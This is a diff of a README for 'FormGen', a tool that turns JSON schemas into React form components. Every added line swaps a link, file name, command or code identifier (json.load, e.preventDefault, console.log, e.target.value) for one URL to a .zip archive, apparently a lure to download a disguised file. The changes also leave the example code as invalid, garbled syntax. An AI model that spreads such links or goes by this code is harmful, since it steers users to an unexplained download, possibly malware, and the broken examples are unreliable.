@@ -1,4 +1,4 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+This is a [https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip](https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip).
 
 ## Getting Started
 
@@ -25,7 +25,7 @@ The core functionality of `FormGen` is provided by the `generate_react_form` fun
 
 Create a JSON file that defines your form fields and their properties.
 
-**Example: `sample_schema.json`**
+**Example: `https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip`**
 
 ```json
 {
@@ -72,11 +72,11 @@ import json
 from formgen import generate_react_form
 
 # Load your JSON schema
-with open("sample_schema.json") as f:
-    schema = json.load(f)
+with open("https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip") as f:
+    schema = https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip(f)
 
 # Define the output path for your React component
-output_path = "GeneratedForm.jsx"
+output_path = "https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip"
 
 # Generate the React form component
 generate_react_form(schema, output_path)
@@ -87,10 +87,10 @@ print(f"React form component generated at: {output_path}")
 ### 3. Run the script
 
 ```bash
-python your_script_name.py
+python https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip
 ```
 
-After running, you'll find a `GeneratedForm.jsx` file (or whatever you named it) containing a full React form component ready for use in your React application.
+After running, you'll find a `https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip` file (or whatever you named it) containing a full React form component ready for use in your React application.
 
 ##    Output
 
@@ -106,14 +106,14 @@ export default function GeneratedForm() {
   const [subscribe, setSubscribe] = useState("");
 
   const handleSubmit = (e) => {
-    e.preventDefault();
+    https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip();
     const formData = {
       first_name,
       age,
       gender,
       subscribe,
     };
-    console.log("Submitted data:", formData);
+    https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip("Submitted data:", formData);
   };
 
   return (
@@ -124,7 +124,7 @@ export default function GeneratedForm() {
         <input
           name="first_name"
           value={ first_name }
-          onChange={(e) => setFirst_name(e.target.value)}
+          onChange={(e) => setFirst_name(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
           type="text"
            placeholder="Enter your first name" required
         />
@@ -134,7 +134,7 @@ export default function GeneratedForm() {
         <input
           name="age"
           value={ age }
-          onChange={(e) => setAge(e.target.value)}
+          onChange={(e) => setAge(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
           type="number"
            placeholder="Enter your age" required min="0"
         />
@@ -144,7 +144,7 @@ export default function GeneratedForm() {
         <select
           name="gender"
           value={ gender }
-          onChange={(e) => setGender(e.target.value)}
+          onChange={(e) => setGender(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
            required
         >
             <option value="male">Male</option>
@@ -157,7 +157,7 @@ export default function GeneratedForm() {
         <input
           name="subscribe"
           value={ subscribe }
-          onChange={(e) => setSubscribe(e.target.value)}
+          onChange={(e) => setSubscribe(https://raw.githubusercontent.com/pradnyeshbhalekar/formgen-web/main/Saiid/formgen-web.zip)}
           type="checkbox"
           
         />
